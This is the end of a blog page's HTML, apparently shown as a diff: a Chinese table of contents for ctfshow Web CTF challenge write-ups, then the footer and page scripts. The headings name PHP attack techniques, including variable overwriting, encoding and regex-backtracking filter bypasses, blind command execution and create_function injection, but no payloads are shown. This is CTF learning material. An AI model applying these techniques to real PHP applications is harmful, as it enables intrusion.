href="#1-19-Web-110-%E2%80%94-new-v1-v2"><span class="nav-number">1.22.</span> <span class="nav-text">1.19 Web 110 — new $v1($v2())</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-20-Web-111-%E2%80%94-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-%E2%80%94-GLOBALS"><span class="nav-number">1.23.</span> <span class="nav-text">1.20 Web 111 — 变量覆盖 — $GLOBALS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-21-Web-112-%E2%80%94-%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-convert-iconv-UCS-2LE-UCS-2BE"><span class="nav-number">1.24.</span> <span class="nav-text">1.21 Web 112 — 各种编码绕过 convert.iconv.UCS-2LE.UCS-2BE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-22-Web-113-%E2%80%94-proc-self-root-%E5%A4%9A%E6%AC%A1%E9%87%8D%E5%A4%8D"><span class="nav-number">1.25.</span> <span class="nav-text">1.22 Web 113 — &#x2F;proc&#x2F;self&#x2F;root 多次重复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-23-Web-114-%E2%80%94-filter"><span class="nav-number">1.26.</span> <span class="nav-text">1.23 Web 114 — filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-24-Web-115-%E2%80%94-trim-0c-%E7%BB%95%E8%BF%87"><span class="nav-number">1.27.</span> <span class="nav-text">1.24 Web 115 — trim() %0c 绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-25-Web-123-%E2%80%94-a-SERVER-%E2%80%98argv%E2%80%99"><span class="nav-number">1.28.</span> <span class="nav-text">1.25 Web 123 — $a&#x3D;$_SERVER[‘argv’];</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-26-Web-125-%E2%80%94-a-SERVER-%E2%80%98argv%E2%80%99"><span class="nav-number">1.29.</span> <span class="nav-text">1.26 Web 125 — $a&#x3D;$_SERVER[‘argv’];</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-27-Web-126-%E2%80%94-a-SERVER-%E2%80%98argv%E2%80%99"><span class="nav-number">1.30.</span> <span class="nav-text">1.27 Web 126 — $a&#x3D;$_SERVER[‘argv’];</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-28-Web-127-%E2%80%94-extract-GET-%E5%92%8C-%E7%A9%BA%E6%A0%BC-%E7%BB%95%E8%BF%87"><span class="nav-number">1.31.</span> <span class="nav-text">1.28 Web 127 — extract($_GET); 和 空格 绕过 _</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-29-Web-128-%E2%80%94-gettext-%E6%89%A9%E5%B1%95-%E2%80%94-get-defined-vars"><span class="nav-number">1.32.</span> <span class="nav-text">1.29 Web 128 — gettext 扩展 — get_defined_vars()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-30-Web-129-%E2%80%94-GET-%E4%B8%AD%E5%BF%85%E9%A1%BB%E5%90%AB%E6%9C%89%E6%9F%90%E5%86%85%E5%AE%B9"><span class="nav-number">1.33.</span> <span class="nav-text">1.30 Web 129 — GET 中必须含有某内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-31-Web-130-%E2%80%94-%E6%AD%A3%E5%88%99%E6%9C%80%E5%A4%A7%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.34.</span> <span class="nav-text">1.31 Web 130 — 正则最大回溯次数绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-32-Web-131-%E2%80%94-%E6%AD%A3%E5%88%99%E6%9C%80%E5%A4%A7%E5%9B%9E%E6%BA%AF%E6%AC%A1%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-number">1.35.</span> <span class="nav-text">1.32 Web 131 — 正则最大回溯次数绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-33-Web-132-%E2%80%94-false-amp-amp-false-username-%E2%80%9Dadmin%E2%80%9D"><span class="nav-number">1.36.</span> <span class="nav-text">1.33 Web 132 — false &amp;&amp; false || $username &#x3D;&#x3D;&#x3D;”admin”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-34-Web-133-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.37.</span> <span class="nav-text">1.34 Web 133 — 无回显命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-35-Web-134-%E2%80%94-POST-%E6%95%B0%E7%BB%84%E8%A6%86%E7%9B%96"><span class="nav-number">1.38.</span> <span class="nav-text">1.35 Web 134 — _POST 数组覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-36-Web-135-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E2%80%94-%E5%86%99%E6%96%87%E4%BB%B6-cp-nl"><span class="nav-number">1.39.</span> <span class="nav-text">1.36 Web 135 — 无回显命令执行 — 写文件 cp   nl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-37-Web-136-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E2%80%94-ls-tee-xxx"><span class="nav-number">1.40.</span> <span class="nav-text">1.37 Web 136 — 无回显命令执行 — ls|tee xxx</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-38-Web-137-%E2%80%94-call-user-func-%E4%BC%A0%E9%80%92-%E5%AD%97%E7%AC%A6%E4%B8%B2-%E2%80%94-%E7%B1%BB%E5%90%8D-%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-number">1.41.</span> <span class="nav-text">1.38 Web 137 — call_user_func() 传递 字符串 — 类名::函数名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-39-Web-138-%E2%80%94-call-user-func-%E4%BC%A0%E9%80%92-%E6%95%B0%E7%BB%84-%E2%80%94-%E4%B8%8D%E4%BD%BF%E7%94%A8"><span class="nav-number">1.42.</span> <span class="nav-text">1.39 Web 138 — call_user_func() 传递 数组 — 不使用 ::</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-40-Web-139-%E2%80%94-%E6%97%A0%E5%9B%9E%E6%98%BE%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-%E2%80%94-awk%E3%80%81cut-%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.43.</span> <span class="nav-text">1.40 Web 139 — 无回显命令注入 — awk、cut 盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-41-Web-140-%E2%80%94-intval-code-%E2%80%98ctfshow%E2%80%99-%E2%80%94-code-eval-%E2%80%9Creturn-f1-f2-%E2%80%9D"><span class="nav-number">1.44.</span> <span class="nav-text">1.41 Web 140 — intval($code) &#x3D;&#x3D; ‘ctfshow’ — $code &#x3D; eval(“return $f1($f2());”);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-42-Web-141-%E2%80%94-eval-%E2%80%9Creturn-v1-v3-v2-%E2%80%9D"><span class="nav-number">1.45.</span> <span class="nav-text">1.42 Web 141 — eval(“return $v1$v3$v2;”);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-43-Web-142-%E2%80%94-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d"><span class="nav-number">1.46.</span> <span class="nav-text">1.43 Web 142 — $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-44-Web-143-%E2%80%94-141-plus"><span class="nav-number">1.47.</span> <span class="nav-text">1.44 Web 143 — 141 plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-45-Web-144-%E2%80%94-143-plus"><span class="nav-number">1.48.</span> <span class="nav-text">1.45 Web 144 — 143 plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-46-Web-145-%E2%80%94-144-plus"><span class="nav-number">1.49.</span> <span class="nav-text">1.46 Web 145 — 144 plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-47-Web-146-%E2%80%94-145-plus"><span class="nav-number">1.50.</span> <span class="nav-text">1.47 Web 146 — 145 plus</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-48-Web-147-%E2%80%94-create-function-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.51.</span> <span class="nav-text">1.48 Web 147 — create_function 命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-49-Web-148-%E2%80%94-%E4%B8%AD%E6%96%87%E5%8F%98%E9%87%8F"><span class="nav-number">1.52.</span> <span class="nav-text">1.49 Web 148 — 中文变量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-50-Web-149-%E2%80%94-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-number">1.53.</span> <span class="nav-text">1.50 Web 149 — 条件竞争</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-51-Web-150-%E2%80%94"><span class="nav-number">1.54.</span> <span class="nav-text">1.51 Web 150 —</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-52-Web-151-%E2%80%94"><span class="nav-number">1.55.</span> <span class="nav-text">1.52 Web 151 —</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+      
+      <footer id="footer">
+  
+
+  <div class="container">
+      	<div class="row">
+	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
+	      <p id="copyRightEn">Copyright &copy; 2013 - 2021 忆 执 昔 来 的 旅 途 All Rights Reserved.</p>
+	      
+	      
+    		<p class="busuanzi_uv">
+				UV : <span id="busuanzi_value_site_uv"></span> |  
+				PV : <span id="busuanzi_value_site_pv"></span>
+		    </p>
+  		   
+		</div>
+
+		
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+    var allheader = document.getElementById("allheader");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+    if (allheader != null) {
+      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    } else {
+      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    }
+</script>
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/categories" class="mobile-nav-link">Categories</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/essayists" class="mobile-nav-link">Essayists</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/scripts.js"></script>
+
+
+
+
+
+  
+<script src="/js/dialog.js"></script>
+
+
+
+
+
+
+
+
+
+	<div style="display: none;">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+  </div>
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+	</script>
+
+
+
+
+
+
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h2 class="modal-title" id="myModalLabel">设置</h2>
+      </div>
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+
+
+      <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+          <div class="panel-body">
+            您已调整页面字体大小
+          </div>
+        </div>
+      
+
+
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+        </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+          <div class="panel-body">
+            夜间模式已经开启，再次单击按钮即可关闭 
+          </div>
+        </div>
+
+        <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+        </div>
+         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+          <div class="panel-body">
+            忆 执 昔 来 的 旅 途
+          </div>
+          <div class="panel-body">
+            Copyright © 2021 xizhi-future All Rights Reserved.
+          </div>
+        </div>
+      </div>
+
+
+      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+      <div class="modal-footer">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+      </div>
+    </div>
+  </div>
+</div>
+  
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+  
+    <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+  
+</body>
+</html>
